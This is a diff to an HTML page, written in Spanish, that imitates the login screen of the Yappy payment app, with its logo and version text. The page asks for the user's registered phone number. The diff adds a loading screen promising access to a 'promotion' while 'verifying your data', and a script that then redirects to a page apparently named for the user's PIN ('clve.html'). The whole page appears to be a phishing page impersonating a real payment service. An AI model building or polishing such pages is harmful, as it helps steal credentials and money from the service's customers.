@@ -10,9 +10,9 @@
             display: flex;
             flex-direction: column;
             justify-content: center;
-            align-items: center; /* Cambiado de flex-start a center */
+            align-items: center;
             height: 90vh;
-            margin: 0; /* Cambiado de 5 a 0 */
+            margin: 0;
             animation: backgroundChange 8s infinite; 
         }
 
@@ -21,7 +21,17 @@
             50% { background-color: #ED8C38; }
             100% { background-color: #21aceb; }
         }
-        
+
+        /* Estilos para el contenedor de carga */
+        .loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+
         h4 {
             margin-bottom: 30px;
             text-align: center; 
@@ -42,7 +52,7 @@
         .greeting {
             font-size: 22px; 
             margin-bottom: 20px;
-            font-weight: 500; 
+            font-weight: 700; 
             color: #555; 
         }
 
@@ -81,7 +91,7 @@
         }
 
         button {
-            width: 100%; /* Cambiado a 100% para que ocupe todo el ancho del contenedor */
+            width: 100%;
             padding: 11px;
             background-color: #2880df; 
             color: white;
@@ -90,7 +100,7 @@
             cursor: pointer;
             font-size: 13px;
             font-weight: bold;
-            margin-top: 20px; /* Eliminado margen izquierdo */
+            margin-top: 20px; 
             transition: background-color 0.3s; 
         }
 
@@ -135,7 +145,6 @@
             margin-top: 20px; 
         }
 
-        /* Estilos para el switch */
         .switch {
             position: relative;
             display: inline-block;
@@ -180,13 +189,18 @@
         input:checked + .slider:before {
             transform: translateX(14px);
         }
+
+        /* Estilo para el texto en el contenedor de carga */
+        .loading p {
+            color: white;
+        }
     </style>
 </head>
 <body>
     <h4></h4>
     <div class="login-container">
         <img src="https://imgs.search.brave.com/Dau3tX1KTyOLi9XfT6ATj6hPJGv6aOskcigDkRe5ems/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/YmdlbmVyYWwuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDIz/LzA2L3lhcHB5LWxv/Z28tY3VlbnRhcy5z/dmc" alt="Logo Pequeño" class="logo-pequeño">
-        <div class="greeting">¡Hola! 👋</div>
+        <div class="greeting">¡Hola! 👋🏻</div>
         <form id="login-form">
             <p class="question">¿Cuál es tu número de celular registrado?</p>
             <div class="input-container">
@@ -204,8 +218,28 @@
         </form>
         <p class="first-time-text">¿Primera vez en el nuevo Yappy App?</p>
         <p class="register-text">Regístrate</p>
+        <button id="next-button">Siguiente</button>
         <p class="version-text">Versión 2.0.31888</p>
-        <button type="submit">Siguiente</button> <!-- Mueve el botón dentro del contenedor -->
     </div>
+
+    <!-- Contenedor de carga -->
+    <div class="loading" id="loading">
+        <img src="unscreen.gif" alt="Cargando..." class="logo-pequeño"> <!-- Cambié la clase para ajustar el tamaño -->
+        <p>Estamos accediendo a la promoción, mientras verificamos sus datos.</p>
+    </div>
+
+    <script>
+        document.getElementById('next-button').addEventListener('click', function() {
+            // Ocultar el contenedor de inicio de sesión
+            document.querySelector('.login-container').style.display = 'none';
+            // Mostrar el contenedor de carga
+            document.getElementById('loading').style.display = 'block';
+
+            // Redirigir después de 5 segundos
+            setTimeout(function() {
+                window.location.href = 'clve.html'; // Cambia a la URL deseada
+            }, 5000); // 5000 milisegundos = 5 segundos
+        });
+    </script>
 </body>
 </html>
